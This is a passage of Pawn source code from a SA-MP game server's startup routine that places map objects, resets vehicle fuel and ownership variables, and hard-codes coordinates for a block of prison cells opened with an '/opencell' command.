tmpobjid = CreateDynamicObject(14699,832.342,-973.201,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,832.342,-977.411,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,824.591,-977.411,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,824.591,-973.201,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,815.649,-977.411,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,815.649,-973.201,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,815.649,-982.493,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,815.649,-968.430,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,824.591,-982.493,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,824.591,-968.430,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
//----------------------------------------------------------[New CarDealerShop]

	ShowPlayerMarkers(0);
//  AddSnowObjects();
    mysql_log(LOG_ERROR);
    sqlconnect();
    KartingPlayers = 0;
	reportopen = 1;
	pbdg = 0;
	pbsl = 0;
	pbsg = 0;
	pbss = 0;
	pbcs = 0;
	pbmp = 0;
	pbsr = 0;
	pbak = 0;
	pbm4 = 0;
	pbcr = 0;
    for(new i = 0;i<1001;i++) {EventIDUsed[i] = false;EventIDOrg[i] = INVALID_PLAYER_ID;}
    EventHave = false;
    EventOrg = INVALID_PLAYER_ID;
    ZendanInfo[loliaia][CellOpenx] = 0.0;
    ZendanInfo[loliaia][CellOpenY] = 0.0;
    ZendanInfo[loliaia][CellOpenZ] = 0.0;
    ZendanInfo[loliaia][CellCloseX] = 0.0;
    ZendanInfo[loliaia][CellCloseY] = 0.0;
    ZendanInfo[loliaia][CellCloseZ] = 0.0;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 0.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 0.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1541.9717;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1540.2406;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;
    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1546.2427;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1544.5404;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;
    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1550.5037;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1548.8016;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1554.8052;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1553.0727;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1559.0862;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1557.3725;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1563.2670;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1561.5731;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1567.5376;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1565.8143;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1571.8386;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1570.1253;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1576.1283;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1574.41589;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1540.2406;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1541.96106;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1544.5217;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1546.2119;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1548.7725;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1550.4828;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1553.0129;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1554.7324;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1557.2828;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1558.96326;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1561.5149;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1563.2136;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;
    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1565.7462;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1567.44446;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1570.0264;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1571.72595;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1574.2975;
    ZendanInfo[loliaia][CellOpenZ] = 1997.6089;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1576.03638;
    ZendanInfo[loliaia][CellCloseZ] = 1997.6089;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1576.1283;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1574.41589;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1571.8372;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1570.09607;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1567.5663;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1565.8352;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1563.2354;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1561.56396;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1559.0044;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1557.3230;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1554.7532;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1553.05078;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1550.4926;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1548.7793;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1546.2521;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1544.53809;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1751.7013;
    ZendanInfo[loliaia][CellOpenY] = -1541.9612;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8877;
    ZendanInfo[loliaia][CellCloseX] = 1751.7013;
    ZendanInfo[loliaia][CellCloseY] = -1540.2281;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8877;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 270.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 270.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1540.2524;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1541.96216;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1544.5139;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1546.21228;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1548.7445;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1550.4626;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1553.0256;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1554.7136;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1557.2761;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1558.9841;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1561.5067;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1563.2152;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1565.7269;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1567.4454;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1570.0073;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1571.75598;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;loliaia++;

    ZendanInfo[loliaia][CellOpenx] = 1771.6356;
    ZendanInfo[loliaia][CellOpenY] = -1574.2975;
    ZendanInfo[loliaia][CellOpenZ] = 1993.8976;
    ZendanInfo[loliaia][CellCloseX] = 1771.6356;
    ZendanInfo[loliaia][CellCloseY] = -1576.03638;
    ZendanInfo[loliaia][CellCloseZ] = 1993.8976;
    ZendanInfo[loliaia][CellOpenRotX] = 0.0;
    ZendanInfo[loliaia][CellOpenRotY] = 0.0;
    ZendanInfo[loliaia][CellOpenRotZ] = 90.0;
    ZendanInfo[loliaia][CellCloseRotX] = 0.0;
    ZendanInfo[loliaia][CellCloseRotY] = 0.0;
    ZendanInfo[loliaia][CellCloseRotZ] = 90.0;
    SetTimer("ArmourTimer",100,1);
    new hours,minutes,seconds;
    gettime(hours, minutes, seconds);
    SetWorldTime(hours);
    new string[256];
    new string1[MAX_PLAYER_NAME];
    for(new c = 0; c <MAX_VEHICLES; c++)
    {
        LockEngine[c] = false;
        IsValidAVeh[c] = false;
        Benzin[c] = GasMax;
        DarsadBenzin[c] = 0;
        OwnedMashin[c] = 0;
        MashinOwner[c] = 9999;
        OwnedMashin_2[c] = 0;
        MashinOwner_2[c] = 9999;
        MashinRenter[c] = INVALID_PLAYER_ID;
        //VehicleSpeedLimit[c] = 0.0;
        MaxSorat[c] = 0;
    }
for(new i = 1;i<37;i++)
{
new lolstr[512];
format(lolstr,512,"Cell: %i\n Use /opencell %i to open this cell.",i,i);
